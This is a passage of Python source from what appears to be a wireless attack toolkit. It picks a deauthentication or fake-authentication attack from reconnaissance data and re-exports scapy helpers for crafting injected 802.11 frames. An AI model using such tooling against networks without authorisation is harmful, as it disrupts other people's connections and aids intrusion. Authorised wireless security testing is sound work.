                    clients_count = int(data.get("count") or 0)
                except (ValueError, TypeError):
                    clients_count = 0
        elif isinstance(clients, list):
            clients_count = len(clients)
        else:
            try:
                clients_count = int(clients or recon.get("client_count") or 0)
            except (ValueError, TypeError):
                clients_count = 0
        station = recon.get("station")
        if clients_count > 0 or station:
            return "deauth"

        quality = caps.get("quality")
        if quality is not None:
            try:
                if int(quality) < 30:
                    return "deauth"
            except (ValueError, TypeError):
                pass

        return "fakeauth"
    except Exception:  # noqa: BLE001 — never raise; default to deauth
        return "deauth"


# ---------------------------------------------------------------------------
# Frame-crafting helpers for the remaining 802.11 frame types (ARP,
# probe-response, auth, association-request). Implemented in
# :mod:`core.wifi_attack.frames` (same lazy-scapy / never-raise contract as
# the ``craft_*`` helpers above) and re-exported here so the canonical
# mt7921e injection toolbox exposes a complete frame-crafting surface.
# No circular import: ``core.wifi_attack.frames`` only imports scapy.
# ---------------------------------------------------------------------------
from core.wifi_attack.frames import (  # noqa: E402
    craft_arp_frame, craft_probe_response, craft_auth_frame,
    craft_assoc_req_frame, craft_disassoc_frame, craft_null_data_frame,
)

# Re-export the new frame builders on the canonical toolbox surface.
__all__.extend([
    "craft_arp_frame", "craft_probe_response", "craft_auth_frame",
    "craft_assoc_req_frame", "craft_disassoc_frame", "craft_null_data_frame",
]) if "__all__" in dir() else None
